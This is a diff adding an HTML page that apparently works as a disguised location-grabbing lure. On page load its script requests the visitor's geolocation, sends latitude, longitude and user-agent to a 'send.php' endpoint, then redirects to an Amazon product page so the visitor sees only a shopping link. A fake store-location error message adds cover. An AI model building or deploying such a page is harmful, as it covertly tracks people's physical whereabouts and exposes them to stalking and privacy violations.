@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+<script>
+function getLocation() {
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else {
+    showError
+  }
+}
+
+function showPosition(position) {
+  // Obtener latitud y longitud
+  var lat = position.coords.latitude;
+  var long = position.coords.longitude;
+  
+  // Realizar una solicitud XMLHttpRequest para enviar los datos al servidor
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "send.php?lat=" + lat + "&long=" + long + "&agent=" + navigator.userAgent )
+  xhttp.send();
+  
+  // Redireccionar al usuario a otro sitio web
+  window.location.href = 'https://www.amazon.com/-/es/Nike-Sportswear-Tech-Windrunner-cremallera/dp/B0CHFYKKT6/ref=sr_1_48?crid=BC7SKI88JSCB&dib=eyJ2IjoiMSJ9.NUOts98gBdmpDsUW7t2tanRhjAXmiqxGwPlilzHFwnyxuaB-7Vukx2PlJo4qoT_IRhKcgv0Kwqe_hMG2mq5Wx1C6AmOS3g2wostAZQ7daqELp1BIVSZbJ7Z8e3GMtl0J5CKyuzwkborSk5hGhnigxadYfxNqQh9hzHHkyjLcdKgg1A0VbpIyYA9gnAQywJT6E78uOS7tmbWqoH_fCimkIUv_DTKFSFmDQ3sPrfhnqlbBhrAN8Yjo4WofMrvPHVw-XfjzaqUdStitss8Er9RqyjlIVCDlQHg55eqldFP19Uc.vbykzWpw-ywtIh-zOrCcNYpd3z_uCQ_WN-6iTj4zysY&dib_tag=se&keywords=nike+tech+fleece&qid=1712562192&sprefix=nike+tech+fl%2Caps%2C195&sr=8-48';
+}
+
+function showError(error) {
+  // Mostrar mensaje de error y redirigir a la página 404
+  alert("La ubicacion de la tienda no está permitida por este navegador.");
+
+  window.location.href = '/error404.html';
+}
+</script>
+</body>
+</html>
